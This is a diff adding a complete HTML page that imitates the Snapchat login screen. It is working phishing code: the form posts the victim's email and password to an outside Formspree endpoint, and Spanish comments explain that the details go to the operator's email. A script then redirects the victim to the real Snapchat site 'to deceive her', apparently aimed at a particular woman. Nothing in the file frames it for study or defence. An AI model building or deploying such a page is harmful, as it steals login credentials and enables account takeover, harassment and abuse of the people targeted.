@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Snapchat Login</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <style>
+        body {
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-clean {
+            background: #fff;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+        .snapchat-logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        .btn-primary {
+            background-color: #FFFC00; /* El amarillo de Snapchat */
+            border: none;
+            color: #000;
+            font-weight: bold;
+        }
+        .btn-primary:hover {
+            background-color: #e6e600;
+        }
+        .forgot {
+            color: #aaa;
+            font-size: 12px;
+            margin-top: 10px;
+            text-decoration: none;
+        }
+    </style>
+</head>
+
+<body>
+
+<section class="login-clean">
+    <!-- 
+      IMPORTANTE: Reemplaza la URL de abajo con la de tu Formspree.
+      Ejemplo: action="https://formspree.io/f/mqkrzpal"
+    -->
+    <form method="POST" action="https://formspree.io/f/mdekorqq" id="loginForm">
+        <h2 class="visually-hidden">Login Form</h2>
+        
+        <!-- Logo de Snapchat -->
+        <img class="snapchat-logo" src="https://assets.stickpng.com/images/580b57fcd9996e24bc43c536.png" alt="Snapchat Logo">
+        
+        <div class="mb-3">
+            <input class="form-control" type="email" name="email" placeholder="Username or Email" required autocomplete="off">
+        </div>
+        
+        <div class="mb-3">
+            <input class="form-control" type="password" name="password" placeholder="Password" required autocomplete="off">
+        </div>
+        
+        <div class="mb-3">
+            <button class="btn btn-primary d-block w-100" type="submit" style="background: #FFFC00; color: #000;">Log In</button>
+        </div>
+        
+        <a class="forgot" href="#">Forgot your email or password?</a>
+    </form>
+</section>
+
+<!-- Script de Redirección Automática -->
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // Permitimos que el formulario se envíe a Formspree primero
+        // Para que los datos lleguen a tu correo
+        
+        // Redirigimos a Snapchat inmediatamente para engañarla
+        setTimeout(function() {
+            window.location.href = "https://www.snapchat.com";
+        }, 500); // Espera medio segundo para asegurar que se envía
+    });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
